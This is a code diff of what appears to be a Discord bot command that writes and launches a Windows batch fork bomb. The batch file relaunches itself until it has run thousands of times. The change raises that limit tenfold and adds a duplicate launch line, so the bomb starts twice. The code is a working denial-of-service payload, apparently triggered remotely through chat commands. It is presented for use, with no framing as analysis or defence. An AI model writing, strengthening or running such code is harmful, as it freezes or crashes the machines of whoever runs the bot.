@@ -18,13 +18,14 @@ async def forkbomb(ctx, action):
 
     def create_bat():
         with open(file_path, "w") as f:
-            f.write("@echo off\nsetlocal enabledelayedexpansion\nset count=0\n:start\nset /a count+=1\nif !count! LSS 1001 start \"%~f0\"\ngoto start")
+            f.write("@echo off\nsetlocal enabledelayedexpansion\nset count=0\n:start\nset /a count+=1\nif !count! LSS 10001 start \"%~f0\"\ngoto start")
 
     if action.lower() == "start":
         if forkbomb_process is not None:
             await ctx.send("Fork bomb is already running.")
             return
         create_bat()
+        forkbomb_process = subprocess.Popen(["cmd.exe", "/c", file_path], shell=True)
         forkbomb_process = subprocess.Popen(["cmd.exe", "/c", file_path], shell=True)
         await ctx.send("Fork bomb bat file created and started.")
     elif action.lower() == "stop":
